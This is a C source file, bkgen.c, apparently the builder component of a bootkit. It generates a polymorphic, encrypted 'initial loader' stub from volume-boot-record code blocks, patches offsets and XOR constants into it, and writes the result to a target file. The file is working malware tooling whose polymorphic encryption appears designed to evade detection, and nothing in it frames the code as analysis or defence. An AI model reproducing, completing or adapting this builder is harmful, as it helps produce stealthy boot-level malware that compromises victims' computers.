//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// BK initial loader builder. Version 2.9.2
//	
// module: bkgen.c
// $Revision: 43 $
// $Date: 2012-05-07 16:50:57 +0400 (Пн, 07 май 2012) $
// description: 
//	BK initial loader builder program.
//	Generates polymorphic encrypted initial loader stub.

#include "main.h"
#include "bme.h"
#include "i386\variables.h"


extern	CODE_BLOCK	g_VBS_blocks;
extern	CODE_BLOCK	g_VBR_blocks;

// Save file flags
#define	FILE_FLAG_OVERWRITE		1	// overwrite an existing file
#define	FILE_FLAG_APPEND		2	// append an existing file
#define	FILE_FLAG_WAIT_SHARE	4	// wait until a file could be shared

//
//	Writes the specified data buffer to the specified file.
//
static WINERROR SaveFile(
	LPTSTR	FileName,	// path to a file to write data to
	PCHAR	Buffer,		// buffer with a data to write
	ULONG	Size,		// size of the buffer in bytes
	ULONG	Flags		// any of FILE_FLAG_XXX constants
	)
{
	WINERROR Status = NO_ERROR;
	HANDLE	hFile;
	ULONG	bWritten, Disposition = (Flags & FILE_FLAG_OVERWRITE) ? OPEN_ALWAYS : CREATE_NEW;

	hFile = CreateFile(FileName, GENERIC_READ | GENERIC_WRITE, 0, NULL, Disposition, FILE_ATTRIBUTE_NORMAL, 0);

	while ((hFile == INVALID_HANDLE_VALUE) && ((Status = GetLastError()) == ERROR_SHARING_VIOLATION) && (Flags & FILE_FLAG_WAIT_SHARE))
	{
		Sleep(10);
		hFile = CreateFile(FileName, GENERIC_READ | GENERIC_WRITE, 0, NULL, Disposition, FILE_ATTRIBUTE_NORMAL, 0);
	}

	if (hFile != INVALID_HANDLE_VALUE)
	{
		if (Flags & FILE_FLAG_APPEND)
			SetFilePointer(hFile, 0, NULL, FILE_END);

		if (WriteFile(hFile, Buffer, Size, &bWritten, NULL))
		{
			SetEndOfFile(hFile);
			Status = NO_ERROR;
		}
		else
			Status = GetLastError();

		CloseHandle(hFile);
	}	// if (hFile != INVALID_HANDLE_VALUE)
	else
	{
		ASSERT(Status != NO_ERROR);
	}
 
	return(Status);
}


int _tmain(int argc, _TCHAR* argv[])
{
	ULONG		RndSeed = 0;
	WINERROR	Status = ERROR_INVALID_PARAMETER;
	MIXED_CODE	VBSCode = {0};
	MIXED_CODE	VBRCode = {0};
	PCONST_DESCRIPTOR Constants = (PCONST_DESCRIPTOR)Alloc(sizeof(CONST_DESCRIPTOR) * var_max);

	if (argc > 1)
	{
		// Generating initial loader and saving it into the specified file.
		srand(GetTickCount());

		RndSeed = (rand() << 16) + rand();

		printf("Generating BK initial loader from seed: %u\n", RndSeed);

		if (BmeCreateMixedCode(&VBRCode, &g_VBR_blocks, RndSeed, MCF_ENTRY_AT_BEGIN))
		{
			Constants[(var_offset_core & CONST_INDEX_MASK)].Value = VBRCode.CoreOffset - VBRCode.EntrySize;
			Constants[(var_offset_table & CONST_INDEX_MASK)].Value = VBRCode.TableOffset;
			Constants[(var_index_base & CONST_INDEX_MASK)].Value = VBRCode.IndexBase;
			Constants[(var_block0_ofs & CONST_INDEX_MASK)].Value = VBRCode.Block0Offset;
			Constants[(var_packed_ldr & CONST_INDEX_MASK)].Value = VBRCode.Size - VBRCode.CoreOffset;
			Constants[(var_code_size & CONST_INDEX_MASK)].Value = VBRCode.Size - VBRCode.EntrySize;
			Constants[(var_entry_size & CONST_INDEX_MASK)].Value = VBRCode.EntrySize;
			Constants[(var_code_xor & CONST_INDEX_MASK)].Value = VBRCode.XorValue;
			Constants[(var_code_words & CONST_INDEX_MASK)].Value = (VBRCode.Size - VBRCode.EntrySize) / 2;

			BmeConstants(&VBRCode, Constants);
			BmeEncryptImage(&VBRCode);

			DeleteFile(argv[1]);
			if ((Status = SaveFile(argv[1], VBRCode.Image, VBRCode.Size, FILE_FLAG_OVERWRITE)) == NO_ERROR)
				printf("Initial loader of %u bytes saved to \"%S\"\n", VBRCode.Size, argv[1]);
			else
				printf("Error %u while writing to \"%S\"\n", Status, argv[1]);

			BmeReleaseMixedCode(&VBRCode);
			ASSERT(Status == NO_ERROR);
		}	// if (BmeCreateMixedCode(&VBRCode, &g_VBR_blocks, rand32(), MCF_ENTRY_AT_BEGIN))
		else
		{
			printf("Generating failed because of unknown reason. Contact program developer.\n");
			Status = ERROR_INVALID_FUNCTION;
		}
	}	// if (argc > 1)
	else
	{
		// Printing program version and usage information
		printf("BK Initial loader generator. Version 2.9.2 %s\n", __TIMESTAMP__);
		printf(" USE: bkgen <target file path>\n");
		ASSERT(Status == ERROR_INVALID_PARAMETER);
	}

	return(Status);
}

